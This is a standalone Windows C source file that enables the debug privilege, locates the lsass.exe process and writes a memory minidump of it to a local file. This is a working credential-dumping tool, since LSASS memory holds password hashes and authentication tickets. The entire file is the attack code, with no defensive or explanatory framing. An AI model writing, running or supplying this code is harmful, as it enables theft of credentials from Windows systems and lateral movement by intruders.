#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")

int FindProcessId(const wchar_t* processName) {
	HANDLE snapshot;
	PROCESSENTRY32 processEntry;
	int processId = 0;
	BOOL result;

	//create snapshot of all processes in system
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == snapshot) {
		printf("Failed to create snapshot of process\n");
		return 0;
	}

	processEntry.dwSize = sizeof(PROCESSENTRY32);

	//retrieve information about first process encountered
	result = Process32First(snapshot, &processEntry);
	if (!result) {
		printf("Failed to retrieve informaiton about the first process\n");
		CloseHandle(snapshot);
		return 0;
	}

	//retrieve information about the process and exit if unsuccessful
	while (result) {
		if (wcscmp(processName, processEntry.szExeFile) == 0) {
			processId = processEntry.th32ProcessID;
			break;
		}
		result = Process32Next(snapshot, &processEntry);
	}

	CloseHandle(snapshot);

	if (processId == 0) {
		printf("Failed to find process with name: %s\n", processName);
	}

	return processId;
}

BOOL setPrivilege(LPCTSTR privilege) {
	HANDLE token;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;
	BOOL result = TRUE;

	//lookup LUID for the specified privilege
	if (!LookupPrivilegeValue(NULL, privilege, &luid))
		result = FALSE;

	//Enable privilege
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//open process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
		result = FALSE;

	//adjust token privileges
	if (!AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		result = FALSE;

	printf(result ? "Successfully enabled privilege: %s\n" : "Failed to enable privilege: %s\n", privilege);

	return result;
}

BOOL createLsassMinidump() {
	bool dumped = FALSE;
	int processId = FindProcessId(L"lsass.exe");
	HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processId);
	HANDLE dumpFileHandle = CreateFile(L"C:\\ExampleFileLocation\\lsass.dmp", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

	//check if opening lsass succeeded
	if (processHandle == NULL || processHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to open lsass.exe prcess. Error: %lu\n", GetLastError());
	}

	//check if creating dump file succeeded
	if (dumpFileHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to create dump file. Error: %lu\n", GetLastError());
		CloseHandle(processHandle);
		return dumped;
	}
	//Write the minidump of the lsass.exe process
	dumped = MiniDumpWriteDump(processHandle, processId, dumpFileHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
	if (dumped) {
		printf("Successfully created minidump of lsass.exe process\n");
	}
	else {
		printf("Failed to create minidump of lsass.exe process. Error: %lu\n", GetLastError());
	}

	CloseHandle(dumpFileHandle);
	CloseHandle(processHandle);

	return dumped;
}

int main(int argc, char* argv[]) {
	//Enable the SE_DEBUG_NAME privilege to access process information
	if (!setPrivilege(SE_DEBUG_NAME)) {
		printf("Failed to enable SE_DEBUG_NAME privilege\n");
		return -1;
	}

	//create a minidump
	if (!createLsassMinidump()) {
		printf("Failed to create minidump of lsass.exe process\n");
		return -1;
	}

	return 0;
}